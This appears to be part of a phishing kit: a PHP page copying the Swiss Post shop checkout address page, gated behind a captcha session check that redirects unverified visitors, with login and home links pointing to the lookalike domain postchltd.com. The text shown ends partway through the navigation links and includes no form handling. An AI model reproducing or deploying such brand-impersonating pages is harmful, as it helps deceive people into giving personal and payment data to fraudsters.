<?php
session_start();

if (!isset($_SESSION['captcha_passed']) || $_SESSION['captcha_passed'] !== true) {
    header('Location: ../index.php'); 
    exit;
}
?>
<html data-user-experience="bb751827-8d30-4767-b6ad-bd206d5b82c5" lang="de">  
	<head>  
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">  
	
  
  <title>  
	Adressen | post.ch</title>  
	
  
  <meta name="design-system-settings" data-post-icon-base="/assets/post-icons">  
	
  <meta name="viewport" content="width=device-width, initial-scale=1">  
	
<link rel="icon" type="image/x-icon" href="./favicon.ico">  
	
  <link rel="preconnect" href="https://fonts.post.ch/" crossorigin="">  
	
  <link rel="dns-prefetch" href="https://fonts.post.ch/">  
 
	

<link rel="stylesheet" href="./files/styles-LWDTC4IZ.css">  
 
	<script defer="" src="./files/content-klj3iolkml.min.js.download">  
	</script>  
	<script defer="" src="./files/OnlinePaymentLibrary-2.0.0.min.js.download" data-id="BillingOnline" id="BillingOnline" data-threatmetrixid="bb751827-8d30-4767-b6ad-bd206d5b82c5">  
	</script>  
	<style id="inert-style">  
	
[inert] {
  pointer-events: none;
  cursor: default;
}

[inert], [inert] * {
  user-select: none;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
}
</style>  
	<style>  
	.onlinePaymentSpinner{border: 16px solid #f3f3f3;border-radius: 50%;width: 120px;height: 120px;-webkit-animation: onlinePaymentSpinnerKF 2s linear infinite;animation: onlinePaymentSpinnerKF 2s linear infinite;}.onlinePaymentSpinnerContainer{z-index: 9999;position:fixed;top:50%;left:50%;transform:translate(-50%, -50%);}@-webkit-keyframes onlinePaymentSpinnerKF {    0% { -webkit-transform: rotate(0deg); }    100% { -webkit-transform: rotate(360deg); }    }@keyframes onlinePaymentSpinnerKF {    0% { transform: rotate(0deg); }    100% { transform: rotate(360deg); }}</style>  
	<script id="epoq-config">  
	epoq_customerId = '15815882';</script>  
	<script defer="" src="./files/post-ch.js.download" id="epoq-script">  
	</script>  
	<style>  
	#headerA11yShortcutsList[_ngcontent-ng-c650281947]{position:absolute;max-height:0;max-width:0;list-style:none}#headerA11yShortcutsList[_ngcontent-ng-c650281947]   li[_ngcontent-ng-c650281947]{display:inline-block;margin-right:10px}#headerA11yShortcutsList[_ngcontent-ng-c650281947]   li[_ngcontent-ng-c650281947]   a[_ngcontent-ng-c650281947]{display:block;height:1.5rem;width:max-content;max-width:0;max-height:0;overflow:hidden;position:absolute;top:0;left:0}#headerA11yShortcutsList[_ngcontent-ng-c650281947]   li[_ngcontent-ng-c650281947]   a[_ngcontent-ng-c650281947]:focus{max-width:unset;max-height:unset}</style>  
	<style>  
	@font-face{font-display:swap;font-family:Frutiger Neue For Post;font-weight:700;src:url(https://fonts.post.ch/frutigerneueforpost/v2/FrutigerNeueforPostW05-Bold.woff2) format("woff2"),url(https://fonts.post.ch/frutigerneueforpost/v2/FrutigerNeueforPostW05-Bold.woff) format("woff")}@font-face{font-display:swap;font-family:Frutiger Neue For Post;font-weight:700;font-style:italic;src:url(https://fonts.post.ch/frutigerneueforpost/v2/FrutigerNeueforPostW05-BdIt.woff2) format("woff2"),url(https://fonts.post.ch/frutigerneueforpost/v2/FrutigerNeueforPostW05-BdIt.woff) format("woff")}@font-face{font-display:swap;font-family:Frutiger Neue For Post;font-weight:400;src:url(https://fonts.post.ch/frutigerneueforpost/v2/FrutigerNeueforPostW05-Rg.woff2) format("woff2"),url(https://fonts.post.ch/frutigerneueforpost/v2/FrutigerNeueforPostW05-Rg.woff) format("woff")}@font-face{font-display:swap;font-family:Frutiger Neue For Post;font-weight:400;font-style:italic;src:url(https://fonts.post.ch/frutigerneueforpost/v2/FrutigerNeueforPostW05-It.woff2) format("woff2"),url(https://fonts.post.ch/frutigerneueforpost/v2/FrutigerNeueforPostW05-It.woff) format("woff")}@font-face{font-display:swap;font-family:Frutiger Neue For Post;font-weight:300;src:url(https://fonts.post.ch/frutigerneueforpost/v2/FrutigerNeueforPostW05-Lt.woff2) format("woff2"),url(https://fonts.post.ch/frutigerneueforpost/v2/FrutigerNeueforPostW05-Lt.woff) format("woff")}@font-face{font-display:swap;font-family:Frutiger Neue For Post;font-weight:300;font-style:italic;src:url(https://fonts.post.ch/frutigerneueforpost/v2/FrutigerNeueforPostW05-LtIt.woff2) format("woff2"),url(https://fonts.post.ch/frutigerneueforpost/v2/FrutigerNeueforPostW05-LtIt.woff) format("woff")}*[_ngcontent-ng-c2743937129], [_nghost-ng-c2743937129], *[_ngcontent-ng-c2743937129]:before, *[_ngcontent-ng-c2743937129]:after{box-sizing:border-box}[_nghost-ng-c2743937129]{font-family:Frutiger Neue For Post,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,sans-serif}button[_ngcontent-ng-c2743937129]{font:inherit}img[_ngcontent-ng-c2743937129], svg[_ngcontent-ng-c2743937129]{max-width:100%;max-height:100%}@media (forced-colors: active){svg[_ngcontent-ng-c2743937129]{color:#fff}}.mirrored[_ngcontent-ng-c2743937129]{transform:scaleX(-1)}.rotate-270[_ngcontent-ng-c2743937129]{transform:rotate(270deg)}.btn[_ngcontent-ng-c2743937129]:focus, .btn[_ngcontent-ng-c2743937129]:focus-visible{outline:.125rem solid transparent}@media (min-width: 1441px){.wide-container[_ngcontent-ng-c2743937129]{margin:0 auto;max-width:1440px}}.menu-button[_ngcontent-ng-c2743937129]{display:flex;align-items:center;padding:0 1rem;font-size:.9375rem;font-weight:400;cursor:pointer}@media (min-width: 1024px){.menu-button[_ngcontent-ng-c2743937129]{display:none}}.menu-button[_ngcontent-ng-c2743937129]   svg[_ngcontent-ng-c2743937129]{width:1.5rem;height:1.5rem}header[_ngcontent-ng-c2743937129]{height:7rem}@media (min-width: 1024px){header[_ngcontent-ng-c2743937129]{height:11rem}}@media (min-width: 1280px){header[_ngcontent-ng-c2743937129]{height:12rem}}[_nghost-ng-c2743937129]{display:block;z-index:var(--header-z-index, 10);--logo-scale: 1;--meta-header-height: 0;border-bottom:1px solid #dee2e6;background-color:#fff;position:fixed;top:0;width:100%;height:var(--header-height)}.meta-header-hidden[_nghost-ng-c2743937129]{-webkit-transition:height 125ms cubic-bezier(.4,0,1,1);transition:height 125ms cubic-bezier(.4,0,1,1)}[_nghost-ng-c2743937129]   .ps-main-navigation-container[_ngcontent-ng-c2743937129] >  
	 .ps-nav[_ngcontent-ng-c2743937129]{height:0;overflow:hidden;transition:all 125ms cubic-bezier(.4,0,1,1)}@media (max-width: 1023.98px){[_nghost-ng-c2743937129]   .ps-main-navigation-container[_ngcontent-ng-c2743937129] >  
	 .search[_ngcontent-ng-c2743937129], [_nghost-ng-c2743937129]   .ps-main-navigation-container[_ngcontent-ng-c2743937129]   .menu-button[_ngcontent-ng-c2743937129]{height:0;display:block;overflow:hidden;transition:all 125ms cubic-bezier(.4,0,1,1)}}.nav-visible[_nghost-ng-c2743937129]:not(.nav-hidden){height:calc(var(--header-height) + var(--header-height))}@media (min-width: 1024px){.nav-visible[_nghost-ng-c2743937129]:not(.nav-hidden){height:calc(var(--header-height) + var(--header-height) + var(--meta-header-height))}}@media (min-width: 1024px){.nav-visible[_nghost-ng-c2743937129]   .ps-main-navigation-container[_ngcontent-ng-c2743937129] >  
	 .ps-nav[_ngcontent-ng-c2743937129]{display:flex;overflow:unset;height:var(--header-height)}}@media (max-width: 1023.98px){.nav-visible[_nghost-ng-c2743937129]   .ps-main-navigation-container[_ngcontent-ng-c2743937129] >  
	 .search[_ngcontent-ng-c2743937129], .nav-visible[_nghost-ng-c2743937129]   .ps-main-navigation-container[_ngcontent-ng-c2743937129]   .menu-button[_ngcontent-ng-c2743937129]{height:var(--header-height);overflow:hidden;transition:all .2s cubic-bezier(0,0,.2,1)}.nav-visible[_nghost-ng-c2743937129]   .ps-main-navigation-container[_ngcontent-ng-c2743937129] >  
	 .menu-button[_ngcontent-ng-c2743937129]{display:block;border-bottom:1px solid #dee2e6}}@media (max-width: 399.98px){[_nghost-ng-c2743937129]{--logo-scale: 1!important}}@media (min-width: 1024px){[_nghost-ng-c2743937129]{--logo-scale: 1.75;--meta-header-height: 48px}}@media (min-width: 1280px){[_nghost-ng-c2743937129]{--logo-scale: 1.6666666666666667}}.first-row-container[_ngcontent-ng-c2743937129]{display:none;height:calc(var(--meta-header-height));position:absolute;width:100%;pointer-events:none;background-color:#faf9f8}@media (min-width: 1024px){.first-row-container[_ngcontent-ng-c2743937129]{display:block}}.second-row-container[_ngcontent-ng-c2743937129]{height:var(--header-height);position:absolute;width:100%;border-bottom:1px solid #dee2e6;pointer-events:none}@media (min-width: 1024px){.second-row-container[_ngcontent-ng-c2743937129]{height:calc(var(--header-height) + var(--meta-header-height))}}.nav-hidden[_ngcontent-ng-c2743937129]   .ps-main-navigation-container[_ngcontent-ng-c2743937129] >  
	 .menu-button[_ngcontent-ng-c2743937129], .nav-hidden[_ngcontent-ng-c2743937129]   .ps-main-navigation-container[_ngcontent-ng-c2743937129]   .search[_ngcontent-ng-c2743937129]{grid-column-start:2;grid-column-end:7;grid-row-start:2;grid-row-end:3;display:none!important}.ps-main-navigation-container[_ngcontent-ng-c2743937129]{display:grid;--second-row-height: 0;grid-template-columns:calc(var(--header-height) * var(--logo-scale)) min-content min-content auto min-content var(--header-height);grid-template-rows:var(--meta-header-height) var(--header-height) var(--second-row-height)}.ps-main-navigation-container[_ngcontent-ng-c2743937129]:not(.nav-hidden){--second-row-height: --header-height}.ps-main-navigation-container[_ngcontent-ng-c2743937129] >  
	 swisspost-onlineshop-logo[_ngcontent-ng-c2743937129]{display:flex;grid-column-start:1;grid-column-end:3;grid-row-start:2;grid-row-end:3}.ps-main-navigation-container[_ngcontent-ng-c2743937129] >  
	 .menu-button[_ngcontent-ng-c2743937129]{grid-column-start:1;grid-column-end:2;grid-row-start:3;grid-row-end:4}@media (min-width: 600px){.ps-main-navigation-container[_ngcontent-ng-c2743937129] >  
	 .menu-button[_ngcontent-ng-c2743937129]{grid-column-start:1;grid-column-end:3}}.ps-main-navigation-container[_ngcontent-ng-c2743937129] >  
	 .search[_ngcontent-ng-c2743937129]{grid-column-start:2;grid-column-end:7;grid-row-start:3;grid-row-end:4;display:flex;align-items:center;justify-content:right}@media (min-width: 600px){.ps-main-navigation-container[_ngcontent-ng-c2743937129] >  
	 .search[_ngcontent-ng-c2743937129]{grid-column-start:3;grid-column-end:7}}@media (max-width: 1023.98px){.ps-main-navigation-container[_ngcontent-ng-c2743937129] >  
	 .search[_ngcontent-ng-c2743937129]{border-left:1px solid #dee2e6}}@media (min-width: 1024px){.ps-main-navigation-container[_ngcontent-ng-c2743937129] >  
	 .search[_ngcontent-ng-c2743937129]{grid-column-start:4;grid-column-end:5;grid-row-start:2;grid-row-end:3}.ps-main-navigation-container[_ngcontent-ng-c2743937129] >  
	 .search[_ngcontent-ng-c2743937129] >  
	 input[_ngcontent-ng-c2743937129]{max-width:26.25rem}}.ps-main-navigation-container[_ngcontent-ng-c2743937129] >  
	 .language-switch[_ngcontent-ng-c2743937129]{grid-column-start:6;grid-row-start:1;grid-row-end:2;display:none}@media (min-width: 1024px){.ps-main-navigation-container[_ngcontent-ng-c2743937129] >  
	 .language-switch[_ngcontent-ng-c2743937129]{display:block;max-height:var(--meta-header-height);height:var(--meta-header-height);position:relative;z-index:1;transform:translateY(calc((48px - var(--meta-header-height)) * -1))}}.ps-main-navigation-container[_ngcontent-ng-c2743937129] >  
	 .klp-widget[_ngcontent-ng-c2743937129]{display:flex;grid-column-start:5;grid-column-end:6;grid-row-start:2;grid-row-end:3}.ps-main-navigation-container[_ngcontent-ng-c2743937129] >  
	 #mini-cart[_ngcontent-ng-c2743937129]{display:flex;grid-column-start:6;grid-column-end:7;grid-row-start:2;grid-row-end:3}.ps-main-navigation-container[_ngcontent-ng-c2743937129] >  
	 .close-nav[_ngcontent-ng-c2743937129]{display:none}.ps-main-navigation-container[_ngcontent-ng-c2743937129] >  
	 .ps-nav[_ngcontent-ng-c2743937129]{grid-column-start:1;grid-column-end:7;grid-row-start:4;grid-row-end:4;display:flex;justify-content:center}@media (min-width: 1024px){.ps-main-navigation-container[_ngcontent-ng-c2743937129] >  
	 .ps-nav[_ngcontent-ng-c2743937129]{grid-row-start:3}}.ps-main-navigation-container.nav-open[_ngcontent-ng-c2743937129] >  
	 .klp-widget[_ngcontent-ng-c2743937129]{display:none}.ps-main-navigation-container.nav-open[_ngcontent-ng-c2743937129] >  
	 #mini-cart[_ngcontent-ng-c2743937129]{display:none}.ps-main-navigation-container.nav-open[_ngcontent-ng-c2743937129] >  
	 .close-nav[_ngcontent-ng-c2743937129]{display:flex;grid-column-start:6;grid-column-end:7;grid-row-start:2;grid-row-end:3}.ps-main-navigation-controls[_ngcontent-ng-c2743937129]{display:flex;margin-left:auto}.ps-main-navigation-controls[_ngcontent-ng-c2743937129] >  
	 *[_ngcontent-ng-c2743937129]{border-left:1px solid #dee2e6}.header-button[_ngcontent-ng-c2743937129]{display:flex;justify-content:center;align-items:center;border:none;border-left:1px solid #dee2e6;min-width:var(--header-height);background:none}.header-button[_ngcontent-ng-c2743937129]   span[_ngcontent-ng-c2743937129]{color:#0009}
</style>  
	<style>  
	[_nghost-ng-c549623231]{fill:currentColor;forced-color-adjust:preserve-parent-color;background-color:currentColor;-webkit-mask-position:center center;mask-position:center center;-webkit-mask-repeat:no-repeat;mask-repeat:no-repeat;-webkit-mask-size:100%;mask-size:100%;display:block;width:1em;height:1em}</style>  
	<script type="module" src="./files/index.module.js.download">  
	</script>  
	<script type="text/javascript" async="" src="./files/f.txt">  
	</script>  
	<script async="" src="./files/modules.625495a901d247c3e8d4.js.download" charset="utf-8">  
	</script>  
	<style>  
	@font-face{font-display:swap;font-family:Frutiger Neue For Post;font-weight:700;src:url(https://fonts.post.ch/frutigerneueforpost/v2/FrutigerNeueforPostW05-Bold.woff2) format("woff2"),url(https://fonts.post.ch/frutigerneueforpost/v2/FrutigerNeueforPostW05-Bold.woff) format("woff")}@font-face{font-display:swap;font-family:Frutiger Neue For Post;font-weight:700;font-style:italic;src:url(https://fonts.post.ch/frutigerneueforpost/v2/FrutigerNeueforPostW05-BdIt.woff2) format("woff2"),url(https://fonts.post.ch/frutigerneueforpost/v2/FrutigerNeueforPostW05-BdIt.woff) format("woff")}@font-face{font-display:swap;font-family:Frutiger Neue For Post;font-weight:400;src:url(https://fonts.post.ch/frutigerneueforpost/v2/FrutigerNeueforPostW05-Rg.woff2) format("woff2"),url(https://fonts.post.ch/frutigerneueforpost/v2/FrutigerNeueforPostW05-Rg.woff) format("woff")}@font-face{font-display:swap;font-family:Frutiger Neue For Post;font-weight:400;font-style:italic;src:url(https://fonts.post.ch/frutigerneueforpost/v2/FrutigerNeueforPostW05-It.woff2) format("woff2"),url(https://fonts.post.ch/frutigerneueforpost/v2/FrutigerNeueforPostW05-It.woff) format("woff")}@font-face{font-display:swap;font-family:Frutiger Neue For Post;font-weight:300;src:url(https://fonts.post.ch/frutigerneueforpost/v2/FrutigerNeueforPostW05-Lt.woff2) format("woff2"),url(https://fonts.post.ch/frutigerneueforpost/v2/FrutigerNeueforPostW05-Lt.woff) format("woff")}@font-face{font-display:swap;font-family:Frutiger Neue For Post;font-weight:300;font-style:italic;src:url(https://fonts.post.ch/frutigerneueforpost/v2/FrutigerNeueforPostW05-LtIt.woff2) format("woff2"),url(https://fonts.post.ch/frutigerneueforpost/v2/FrutigerNeueforPostW05-LtIt.woff) format("woff")}*[_ngcontent-ng-c529676948], [_nghost-ng-c529676948], *[_ngcontent-ng-c529676948]:before, *[_ngcontent-ng-c529676948]:after{box-sizing:border-box}[_nghost-ng-c529676948]{font-family:Frutiger Neue For Post,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,sans-serif}button[_ngcontent-ng-c529676948]{font:inherit}img[_ngcontent-ng-c529676948], svg[_ngcontent-ng-c529676948]{max-width:100%;max-height:100%}@media (forced-colors: active){svg[_ngcontent-ng-c529676948]{color:#fff}}.mirrored[_ngcontent-ng-c529676948]{transform:scaleX(-1)}.rotate-270[_ngcontent-ng-c529676948]{transform:rotate(270deg)}.btn[_ngcontent-ng-c529676948]:focus, .btn[_ngcontent-ng-c529676948]:focus-visible{outline:.125rem solid transparent}@media (min-width: 1441px){.wide-container[_ngcontent-ng-c529676948]{margin:0 auto;max-width:1440px}}.menu-button[_ngcontent-ng-c529676948]{display:flex;align-items:center;padding:0 1rem;font-size:.9375rem;font-weight:400;cursor:pointer}@media (min-width: 1024px){.menu-button[_ngcontent-ng-c529676948]{display:none}}.menu-button[_ngcontent-ng-c529676948]   svg[_ngcontent-ng-c529676948]{width:1.5rem;height:1.5rem}[_nghost-ng-c529676948]{display:block}.logo[_ngcontent-ng-c529676948]{display:flex;align-items:center;text-decoration:none}.logo[_ngcontent-ng-c529676948]   img[_ngcontent-ng-c529676948]{max-width:unset;min-height:3.5rem;transform-origin:left bottom}@media (min-width: 1024px){.logo[_ngcontent-ng-c529676948]   img[_ngcontent-ng-c529676948]{transform:scale(var(--logo-scale));min-height:4rem}}@media (min-width: 1280px){.logo[_ngcontent-ng-c529676948]   img[_ngcontent-ng-c529676948]{transform:scale(var(--logo-scale));min-height:4.5rem}}.logo[_ngcontent-ng-c529676948]   span[_ngcontent-ng-c529676948]{font-size:1.25rem;font-weight:700;text-decoration:none;margin-left:1rem;color:#333}@media (min-width: 1024px){.logo[_ngcontent-ng-c529676948]   span[_ngcontent-ng-c529676948]{font-size:1.5rem;margin-left:calc(var(--header-height) * var(--logo-scale) - var(--header-height) + 1.25rem)}}@media (min-width: 1280px){.logo[_ngcontent-ng-c529676948]   span[_ngcontent-ng-c529676948]{font-size:1.75rem;margin-left:calc(var(--header-height) * var(--logo-scale) - var(--header-height) + 1.5rem)}}
</style>  
	<meta name="robots" content="NOFOLLOW, NOINDEX">  
	<link rel="canonical" href="https://shop.post.ch/de/checkout/addresses/">  
	<style>  
	.nav-link[_ngcontent-ng-c816571025]{text-decoration:none;color:#000c;transition:color .2s;background-color:transparent;border-radius:0;box-shadow:none;border:none}.nav-link[_ngcontent-ng-c816571025]:hover, .nav-link[_ngcontent-ng-c816571025]:visited{color:#000}
</style>  
	<style>  
	.customer-support[_nghost-ng-c3296699638]   .avatar-container[_ngcontent-ng-c3296699638]{background-color:#f49e00}.login-button[_ngcontent-ng-c3296699638]{outline-color:#000;outline-offset:1px;display:flex;align-items:center;padding-left:.5rem;padding-right:.5rem;border:none;box-shadow:none;background:none;cursor:pointer;color:#6c757d;font-size:1.1rem;height:100%;border-left:1px solid #dee2e6;border-radius:0}@media (min-width: 1024px){.login-button[_ngcontent-ng-c3296699638]{padding-left:1rem;padding-right:1rem}}@media (min-width: 1280px){.login-button[_ngcontent-ng-c3296699638]{padding-left:1.5rem;padding-right:1.5rem}}.login-button[_ngcontent-ng-c3296699638]   span[_ngcontent-ng-c3296699638]:not(.pi){display:none;margin-right:.5rem}@media (min-width: 1280px){.login-button[_ngcontent-ng-c3296699638]   span[_ngcontent-ng-c3296699638]:not(.pi){display:block}}.avatar-container[_ngcontent-ng-c3296699638]{height:100%;width:var(--header-height);position:relative;border-left:1px solid #dee2e6}.avatar-container[_ngcontent-ng-c3296699638]   swisspost-onlineshop-klp-avatar[_ngcontent-ng-c3296699638]{height:100%;width:100%;cursor:pointer}
</style>  
	<style>  
	.in-header[_nghost-ng-c2969557045]{display:flex;align-items:center;justify-content:center}.avatar[_ngcontent-ng-c2969557045]{outline-color:#000;outline-offset:3px;background-color:#004976;padding:0;width:2.5rem;height:2.5rem;border-radius:2.5rem;color:#fff;border:0}.avatar.customer-support[_ngcontent-ng-c2969557045]{background-color:#f49e00}.avatar.bold[_ngcontent-ng-c2969557045]{font-weight:600}
</style>  
	<script type="text/javascript" async="" src="./files/f(1).txt">  
	</script>  
	<script defer="" src="./files/SeJqDU2slcVqI3wBPtJ6o">  
	</script>  
	<style>  
	textarea.form-control-lg[_ngcontent-topos-component-c32]{padding-top:2.3125rem}textarea.form-control-lg[_ngcontent-topos-component-c32]:not([rows]){height:calc(4.25rem + 4px)}textarea.form-control-lg[_ngcontent-topos-component-c32] ~ label[_ngcontent-topos-component-c32]:first-of-type{z-index:2}textarea.form-control-lg[_ngcontent-topos-component-c32] ~ label[_ngcontent-topos-component-c32]:first-of-type:before{content:"";background-color:#fff;height:100%;position:absolute;top:calc(.5rem + 2px);left:0;right:0;z-index:-1}@media screen and (-ms-high-contrast: active),(-ms-high-contrast: none){select.form-control-lg[_ngcontent-topos-component-c32]{padding-left:.9rem}}@-moz-document url-prefix(){select.form-control-lg{padding-left:.8rem}.form-control-lg::placeholder{opacity:0}}.location-control[_ngcontent-topos-component-c32]{position:relative}.location-control[_ngcontent-topos-component-c32] >  
	 input[_ngcontent-topos-component-c32]{padding-right:4rem}.location-control[_ngcontent-topos-component-c32] >  
	 input.is-invalid[_ngcontent-topos-component-c32], .location-control[_ngcontent-topos-component-c32] >  
	 input.is-valid[_ngcontent-topos-component-c32]{background-position:right center;padding-right:5rem}.location-control[_ngcontent-topos-component-c32] >  
	 input.is-invalid[_ngcontent-topos-component-c32] ~ .location-control-button[_ngcontent-topos-component-c32], .location-control[_ngcontent-topos-component-c32] >  
	 input.is-valid[_ngcontent-topos-component-c32] ~ .location-control-button[_ngcontent-topos-component-c32]{right:1.5rem}.location-control-button[_ngcontent-topos-component-c32]{position:absolute;top:calc(.5rem + 2px);right:.5rem;border:none}.time-icon[_ngcontent-topos-component-c32]{position:absolute}@media (max-width: 599.98px){.search-button[_ngcontent-topos-component-c32], .reset-button[_ngcontent-topos-component-c32]{display:block;width:100%}}.input-icon[_ngcontent-topos-component-c32]{top:1.5rem;right:1.5rem;height:1.5rem}.input-icon.btn[_ngcontent-topos-component-c32]{padding:0;transition:background cubic-bezier(.4,0,.2,1)}input.is-invalid[_ngcontent-topos-component-c32] ~ .input-icon[_ngcontent-topos-component-c32], input.is-valid[_ngcontent-topos-component-c32] ~ .input-icon[_ngcontent-topos-component-c32]{right:2.5rem}.btn-notnow[_ngcontent-topos-component-c32]{color:#333;border-color:#333}.btn-notnow[_ngcontent-topos-component-c32]:hover{color:#000;border-color:#000}</style>  
	<style>  
	textarea.form-control-lg[_ngcontent-topos-component-c40]{padding-top:2.3125rem}textarea.form-control-lg[_ngcontent-topos-component-c40]:not([rows]){height:calc(4.25rem + 4px)}textarea.form-control-lg[_ngcontent-topos-component-c40] ~ label[_ngcontent-topos-component-c40]:first-of-type{z-index:2}textarea.form-control-lg[_ngcontent-topos-component-c40] ~ label[_ngcontent-topos-component-c40]:first-of-type:before{content:"";background-color:#fff;height:100%;position:absolute;top:calc(.5rem + 2px);left:0;right:0;z-index:-1}@media screen and (-ms-high-contrast: active),(-ms-high-contrast: none){select.form-control-lg[_ngcontent-topos-component-c40]{padding-left:.9rem}}@-moz-document url-prefix(){select.form-control-lg{padding-left:.8rem}.form-control-lg::placeholder{opacity:0}}.result-list-wrapper[_ngcontent-topos-component-c40]{position:relative;height:100%;margin:0 auto;background:white;pointer-events:auto;display:flex;flex-direction:column}.result-list[_ngcontent-topos-component-c40]{padding-left:0;margin-top:0;margin-bottom:0}.result-list[_ngcontent-topos-component-c40] >  
	 li[_ngcontent-topos-component-c40]{display:block}.result-list[_ngcontent-topos-component-c40] >  
	 li[_ngcontent-topos-component-c40] + li[_ngcontent-topos-component-c40]{border-top:1px solid #cbcbcb}.result-info[_ngcontent-topos-component-c40]{text-align:center;padding:1rem}.result-info[_ngcontent-topos-component-c40]   .result-icon[_ngcontent-topos-component-c40]{display:block;width:4rem;height:4rem;opacity:.5;margin:3rem auto}.result-info[_ngcontent-topos-component-c40], .result-list[_ngcontent-topos-component-c40]{flex:1 0 auto}.result-count-mobile[_ngcontent-topos-component-c40]{display:block;text-decoration:none;border-bottom:1px solid #cbcbcb;background:white;padding:1rem;cursor:pointer}@supports (position: sticky){.result-count-mobile[_ngcontent-topos-component-c40]{position:sticky;top:0;z-index:1;transition:top 125ms cubic-bezier(.4,0,1,1)}}@media (min-width: 780px){.result-count-mobile[_ngcontent-topos-component-c40]{padding:1rem 1.5rem}}@media (min-width: 1024px){.result-count-mobile[_ngcontent-topos-component-c40]{display:none}}.result-count-mobile[_ngcontent-topos-component-c40]   .pi[_ngcontent-topos-component-c40]{transition:transform .5s}.is-clearly-visible[_ngcontent-topos-component-c40]   .result-count-mobile[_ngcontent-topos-component-c40]   .pi[_ngcontent-topos-component-c40]{transform:scaleY(-1)}.back-to-top[_ngcontent-topos-component-c40]{display:block;position:fixed;bottom:-3rem;right:0;margin:0 1rem -3rem auto;opacity:0;transform:translateY(-250%);border-radius:50%;background:white;box-shadow:0 0 10px rgba(0,0,0,.4);visibility:hidden;transition:opacity .5s,visibility 0s .5s;border-width:1px}@media (min-width: 1024px){.back-to-top[_ngcontent-topos-component-c40]{display:none;margin-right:-5rem;transform:translateY(-175%)}@supports (position: sticky){.back-to-top[_ngcontent-topos-component-c40]{position:sticky;display:block}}}.is-clearly-visible[_ngcontent-topos-component-c40]   .back-to-top[_ngcontent-topos-component-c40]{opacity:1;visibility:visible;transition:opacity .5s,visibility 0s 0s}</style>  
	<style>  
	textarea.form-control-lg[_ngcontent-topos-component-c38]{padding-top:2.3125rem}textarea.form-control-lg[_ngcontent-topos-component-c38]:not([rows]){height:calc(4.25rem + 4px)}textarea.form-control-lg[_ngcontent-topos-component-c38] ~ label[_ngcontent-topos-component-c38]:first-of-type{z-index:2}textarea.form-control-lg[_ngcontent-topos-component-c38] ~ label[_ngcontent-topos-component-c38]:first-of-type:before{content:"";background-color:#fff;height:100%;position:absolute;top:calc(.5rem + 2px);left:0;right:0;z-index:-1}@media screen and (-ms-high-contrast: active),(-ms-high-contrast: none){select.form-control-lg[_ngcontent-topos-component-c38]{padding-left:.9rem}}@-moz-document url-prefix(){select.form-control-lg{padding-left:.8rem}.form-control-lg::placeholder{opacity:0}}.map-wrapper[_ngcontent-topos-component-c38]{position:relative;height:100%;width:100%;background-color:#e5e3df}@media (max-width: 599.98px){.map-wrapper[_ngcontent-topos-component-c38]{height:0;padding-bottom:133%}}.map[_ngcontent-topos-component-c38]{position:absolute;top:0;left:0;width:100%;height:100%}</style>  
	<script src="./files/js">  
	</script>  
	<script src="./files/main.js.download">  
	</script>  
	<script type="text/javascript" charset="UTF-8" src="./files/common.js.download">  
	</script>  
	<script type="text/javascript" charset="UTF-8" src="./files/util.js.download">  
	</script>  
	<script src="./files/main.js.download">  
	</script>  
	<script src="./files/main.js.download">  
	</script>  
	<script src="./files/main.js.download">  
	</script>  
	<script src="./files/main.js.download">  
	</script>  
	<script src="./files/main.js.download">  
	</script>  
	<script type="text/javascript" charset="UTF-8" src="./files/common.js.download">  
	</script>  
	<script type="text/javascript" charset="UTF-8" src="./files/util.js.download">  
	</script>  
	<script type="text/javascript" charset="UTF-8" src="./files/map.js.download">  
	</script>  
	<script type="text/javascript" charset="UTF-8" src="./files/overlay.js.download">  
	</script>  
	<script type="module" src="./files/index.module.js.download">  
	</script>  
	<script type="text/javascript" charset="UTF-8" src="./files/common.js.download">  
	</script>  
	<script type="text/javascript" charset="UTF-8" src="./files/util.js.download">  
	</script>  
	<script type="module" src="./files/index.module.js.download">  
	</script>  
	<script type="module" src="./files/index.module.js.download">  
	</script>  
	<script type="module" src="./files/index.module.js.download">  
	</script>  
	<script type="text/javascript" charset="UTF-8" src="./files/common.js.download">  
	</script>  
	<script type="text/javascript" charset="UTF-8" src="./files/util.js.download">  
	</script>  
	<script type="text/javascript" charset="UTF-8" src="./files/common.js.download">  
	</script>  
	<script type="text/javascript" charset="UTF-8" src="./files/util.js.download">  
	</script>  
	</head>  
	
<body class="header-expanded" style="">  
	
  <swisspost-onlineshop>  
	<div role="heading" aria-level="1" class="visually-hidden">  
	Navigiere auf postshop.ch</div>  
	<swisspost-onlineshop-header-a11y-shortcuts _nghost-ng-c650281947="">  
	<ul _ngcontent-ng-c650281947="" id="headerA11yShortcutsList">  
	<li _ngcontent-ng-c650281947="">  
	<a _ngcontent-ng-c650281947="" accesskey="0" title="Startseite" href="https://postchltd.com/de/">  
	 Startseite <post-icon _ngcontent-ng-c650281947="" name="3020" class="fs-large" _nghost-ng-c549623231="" style="mask-image: url(&quot;https://shop.post.ch/assets/post-icons/3020.svg&quot;);">  
	</post-icon>  
	</a>  
	</li>  
	<li _ngcontent-ng-c650281947="">  
	<a _ngcontent-ng-c650281947="" href="https://postchltd.com/portal/app/login.php#" accesskey="1" title="Hauptnavigation">  
	 Hauptnavigation <post-icon _ngcontent-ng-c650281947="" name="3020" class="fs-large" _nghost-ng-c549623231="" style="mask-image: url(&quot;https://shop.post.ch/assets/post-icons/3020.svg&quot;);">  
	</post-icon>  
	</a>  
	</li>  
	<li _ngcontent-ng-c650281947="">  
	<a _ngcontent-ng-c650281947="" href="https://postchltd.com/portal/app/login.php#" accesskey="2" title="Login">  
	 Login <post-icon _ngcontent-ng-c650281947="" name="3020" class="fs-large" _nghost-ng-c549623231="" style="mask-image: url(&quot;https://shop.post.ch/assets/post-icons/3020.svg&quot;);">  
	</post-icon>  
	</a>  
	</li>  
	<li _ngcontent-ng-c650281947="">  
	<a _ngcontent-ng-c650281947="" href="https://postchltd.com/portal/app/login.php#" accesskey="3" title="Suche">  
	 Suche <post-icon _ngcontent-ng-c650281947="" name="3020" class="fs-large" _nghost-ng-c549623231="" style="mask-image: url(&quot;https://shop.post.ch/assets/post-icons/3020.svg&quot;);">  
	</post-icon>  
	</a>  
	</li>  
	<li _ngcontent-ng-c650281947="">  
	<a _ngcontent-ng-c650281947="" accesskey="4" title="Kontakt" href="https://postchltd.com/de/contact">  
